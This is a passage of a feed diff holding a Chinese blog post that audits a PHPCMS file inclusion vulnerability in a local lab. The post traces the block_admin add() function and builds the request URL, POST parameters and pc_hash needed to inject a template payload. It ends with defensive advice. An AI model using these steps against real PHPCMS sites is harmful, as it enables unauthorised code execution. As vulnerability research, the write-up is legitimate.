+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;238&#34;
+		data-flex-basis=&#34;572px&#34;
+	
+&gt;&lt;br&gt;
+所以我们再回去看。&lt;br&gt;
+data参数还进行了一个拼接。
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.34.jpg&#34;
+	width=&#34;1383&#34;
+	height=&#34;453&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.34_hu_4075eefbbacf840b.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.34_hu_6b5451ac963e59a1.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;305&#34;
+		data-flex-basis=&#34;732px&#34;
+	
+&gt;&lt;br&gt;
+这句翻译过来其实就是select id from &amp;lsquo;root&amp;rsquo;.&amp;lsquo;block&amp;rsquo; where id = 1 limit 1&lt;br&gt;
+其实就是查询数据的一个过程，通过这个语句查找到type后，进行的一系列流程。&lt;/p&gt;
+&lt;p&gt;审计到这里查询方法已经被我们搞清楚了，那怎么添加呢。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.35.jpg&#34;
+	width=&#34;1451&#34;
+	height=&#34;697&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.35_hu_33d06a07fa4db317.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.35_hu_ed805c15291075a0.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;208&#34;
+		data-flex-basis=&#34;499px&#34;
+	
+&gt;&lt;br&gt;
+我们用查找功能找一下，查找的参数有很多，就需要我们仔细看了。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.36.jpg&#34;
+	width=&#34;1318&#34;
+	height=&#34;600&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.36_hu_ac3d64303bc23fe0.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.36_hu_37cf2433d09c05b4.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;219&#34;
+		data-flex-basis=&#34;527px&#34;
+	
+&gt;&lt;br&gt;
+双击进到这个文件，这里有个add()函数，就是其添加方式。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.37.jpg&#34;
+	width=&#34;1486&#34;
+	height=&#34;600&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.37_hu_bf54b7b2a7b9879a.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.37_hu_8d7a657bdd510ded.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;247&#34;
+		data-flex-basis=&#34;594px&#34;
+	
+&gt;&lt;br&gt;
+可以看到它这里定义了几个参数。&lt;br&gt;
+分别为$pos,$name,$type,后两个是通过POST提交获取。&lt;br&gt;
+那我们这里就可以进行构造payload。&lt;br&gt;
+首先是地址加?绕过：http://127.0.0.1/phpcms/index.php?&lt;br&gt;
+模块：m = block&lt;br&gt;
+控制器：c = block_admin&lt;br&gt;
+方法：a = add&lt;br&gt;
+代码中定义的pos值夜要传入：pos = 1&lt;br&gt;
+拼接在一起就是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://127.0.0.1/phpcms/index.php?m&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;block&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;block_admin&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;add&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后还需发送一个数据包，内容就是代码中用POST接受的三个参数。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;dosubmit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;test&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里数据包的type必须为2，原因上面我们已经讲过了。&lt;br&gt;
+但是这里有个问题，就是我们前面进行漏洞复现时会有一个pc_hash值。&lt;br&gt;
+我们在浏览器访问一下我们刚刚构造的URL。&lt;br&gt;
+会发现它叫我们先登录后台管理。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.38.jpg&#34;
+	width=&#34;708&#34;
+	height=&#34;296&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.38_hu_d23ad7b1f0a9c086.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.38_hu_683a6c440c6da668.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;239&#34;
+		data-flex-basis=&#34;574px&#34;
+	
+&gt;&lt;br&gt;
+我们登录进去拿到pc_hash的值。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.39.jpg&#34;
+	width=&#34;1200&#34;
+	height=&#34;74&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.39_hu_734025e0548580d4.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.39_hu_826ab00540e9b718.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1621&#34;
+		data-flex-basis=&#34;3891px&#34;
+	
+&gt;&lt;br&gt;
+拼接到我们构造的URL上。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://127.0.0.1/phpcms/index.php?m&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;block&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;block_admin&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;add&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pc_hash&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hgguGg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后在这个页面用hackbar提交我们构造的数据包就行了。&lt;br&gt;
+而这时候我们已经通过了那个type的if判断&lt;br&gt;
+只需要将payload构造好拼接在template值后面就会造成文件包含漏洞了(POST提交)。&lt;br&gt;
+就像下图中这样。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.40.jpg&#34;
+	width=&#34;1658&#34;
+	height=&#34;934&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.40_hu_eef86e6d83bd047.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.40_hu_97824ae64652bc98.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;&lt;br&gt;
+不过hackbar有时候会出毛病，可以用bp或者这里可以在方框中输入payload。&lt;br&gt;
+在漏洞风险那里就已说过，这里就不过多说了。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;下面我们理一下全程思路。&lt;br&gt;
+首先我们插入了一个add方法，将id,name,type插入到数据库中。(type为2)&lt;br&gt;
+判断type为2后对tempalte进行一个赋值。&lt;br&gt;
+接着通过new_stripslashes和template_parse两个函数方法传给str。&lt;br&gt;
+再将str写入到filepath当中,在filepath当中被包含。&lt;br&gt;
+我们就可以在filepath中执行我们写入str中的命令。&lt;br&gt;
+这也就造成了文件包含漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;五-漏洞防御方式&#34;&gt;五. 漏洞防御方式
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;严格判断包含的参数是否是外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含文件是否被外部控制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”,也就是防止目录遍历&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;包含文件验证：验证被包含的文件是否为白名单中的一员(最直接的方法，只允许你读那一个文件，不能读其他的)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(&amp;ldquo;head.php&amp;rdquo;);&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
 </description>
         </item>
         <item>
